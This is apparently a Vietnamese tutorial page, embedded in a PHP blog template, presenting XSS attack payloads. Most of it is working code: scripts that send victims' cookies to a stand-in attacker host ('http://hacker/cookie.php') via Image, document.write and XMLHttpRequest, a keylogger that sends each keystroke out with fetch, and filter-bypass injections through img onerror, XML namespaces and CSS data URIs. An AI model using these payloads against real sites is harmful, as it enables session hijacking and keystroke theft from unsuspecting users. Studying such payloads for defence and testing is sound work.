<main class="main has-sticky" role="main">
    <div class="content">
        <article id="post-xss/xss_bypass" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    Kỹ thuật tấn công XSS
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
                <?php if($src_youtube != ''){echo '<button id="introduce-btn"><img src="public/images/play-circle.png" class="img-circle img-rotate" style="height: 24px; width: 24px; margin-right: 5px" " />Hướng Dẫn</button>';} ?>
                </div>
            </div>
            <?php echo get_iframe_youtube($src_youtube); ?>
            <div class="article-entry marked-body" itemprop="articleBody">
                <p>Trong 3 phần trước, mình đã hướng dẫn các bạn chủ yếu về các loại tấn công XSS. Đó là hiểu rõ về cơ chế và cách thức hoạt động của từng loại.<br>Nhưng để hoàn thiện XSS, ta còn cần các đoạn <strong>script</strong> tấn công hay và nguy hiểm hơn so với ví dụ mình đã lấy.<br>Trong phần này, mình sẽ hướng dẫn một số các payload XSS hay. </p>
                <h1 id="Document-location"><a href="#Document-location" class="headerlink" title="Document.location"></a>Document.location</h1>
                <p>Trong test case để cho dễ hiểu thì mình để <strong>document.location</strong> để đánh cắp cookie chứ thực tế không ai sử dụng điều đó. Bởi vì:</p>
                <ul>
                    <li>Dễ bị phát hiện. Khi vào mà trang web cứ redirect sang domain khác thì người dùng dễ chú ý.</li>
                    <li>Bị lộ nơi lấy cookie.</li>
                </ul>
                <p>Nhưng không có nghĩa là <strong>document.location</strong> không được sử dụng trong XSS.<br>Trong thực tế họ dùng XSS với document.location để đánh cắp người dùng, lưu lượng truy cập.</p>
                <h3 id="Vi-du"><a href="#Vi-du" class="headerlink" title="Ví dụ"></a>Ví dụ</h3>
                <p>Web A bị dính Stored XSS, ông B muốn lợi dụng điều đó để tăng lưu lượng truy cập cho web B của mình.<br>Ông B sẽ để: <strong>document.location=”WEB B”;</strong><br>Vậy những người dùng sẽ bị chuyển hướng sang Web B khi load trang web A.</p>
                <h1 id="Dung-Image"><a href="#Dung-Image" class="headerlink" title="Dùng Image."></a>Dùng Image.</h1>
                <p>Payload:<br></p>
                <figure class="highlight html">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">new Image().src="http://hacker/cookie.php?c="+document.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>'<span class="attr">XSS</span>');&gt;</span> ## Bypass filter chữ script.</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml">document.write('<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">\</span>"<span class="attr">http:</span>//<span class="attr">hacker</span>/<span class="attr">cookie.php</span>?<span class="attr">c</span>=<span class="string">'+document.cookie+'</span>\"');</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Khi load một trang web, sẽ có những hình ảnh dưới thẻ <strong>image</strong> html. Và khi load những hình ảnh này về, trình duyệt tải về và chạy một cách thầm lặng rồi hiển thị lên.<br>Chứ không có bị redirect sang trang lưu mã nguồn của hình ảnh,đúng không nào?<br>Do đó, attacker sẽ lợi dụng điều này, để cho trình duyệt truy cập vào địa chỉ attacker để lấy <strong>cookie</strong> mà không bị redirect để người dùng phát hiện.</p>
                <h1 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h1>
                <figure class="highlight html">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var cookie = encodeURIComponent(document.cookie);</span></span><br><span class="line"><span class="undefined">var xhttp = new XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">xhttp.open("GET", "http://hacker/cookie.php?c=" + cookie, true);</span></span><br><span class="line"><span class="undefined">xhttp.send();</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p>Cách này cũng khá hay và thầm lặng, nhưng vấn đề của nó là payload khá dài, vì nếu những form có limit số kí tự thì khó dùng được.</p>
                <h1 id="Keylog"><a href="#Keylog" class="headerlink" title="Keylog"></a>Keylog</h1>
                <p>Payload:<br></p>
                <figure class="highlight html">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">'document.onkeypress=function(e){fetch("http://hacker/cookie.php?c="+String.fromCharCode(e.which))},this.remove();'</span>&gt;</span></span><br><span class="line">``` </span><br><span class="line">Dùng XSS để tạo keylog lắng nghe bàn phím của người dùng và gửi về.</span><br><span class="line"></span><br><span class="line"># XSS in file</span><br><span class="line">Ngoài các input dạng text, XSS còn có thể bị inject qua file. Mình sẽ lấy một số ví dụ về file XML, CSS. Còn lại các bạn tự tìm hiểu thêm trong đường dẫn Tham Khảo.</span><br><span class="line"></span><br><span class="line">## XML</span><br><span class="line">``` xml</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">something:script</span> <span class="attr">xmlns:something</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">something:script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2>
                <figure class="highlight">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line">&lt;<span class="selector-tag">style</span>&gt;</span><br><span class="line"><span class="selector-tag">div</span>  {</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">"data:image/jpg;base64,&lt;\/style&gt;&lt;svg/onload=alert(document.domain)&gt;"</span>);</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#cccccc</span>;</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <h1 id="Ngoai-ra-con-cac-cach-de-bypass-cac-loai-filter-tim-hieu-ro-hon-trong-duong-dan-tham-khao-them"><a href="#Ngoai-ra-con-cac-cach-de-bypass-cac-loai-filter-tim-hieu-ro-hon-trong-duong-dan-tham-khao-them" class="headerlink" title="Ngoài ra còn các cách để bypass các loại filter, tìm hiểu rõ hơn trong đường dẫn tham khảo thêm."></a>Ngoài ra còn các cách để bypass các loại filter, tìm hiểu rõ hơn trong đường dẫn tham khảo thêm.</h1>
                <h1 id="Tham-Khao-Them"><a href="#Tham-Khao-Them" class="headerlink" title="Tham Khảo Thêm"></a>Tham Khảo Thêm</h1>
                <ul>
                    <li><strong>XSS All Payload</strong>: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection</a></li>
                </ul>
            </div>
        </article>
        <?php
        if(isset($_GET['change_status'])){
            if($_GET['change_status'] == 1){
                change_status($id_post);
            }
        }
        echo print_footer_status($id_post,$title);
        ?>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>

</main>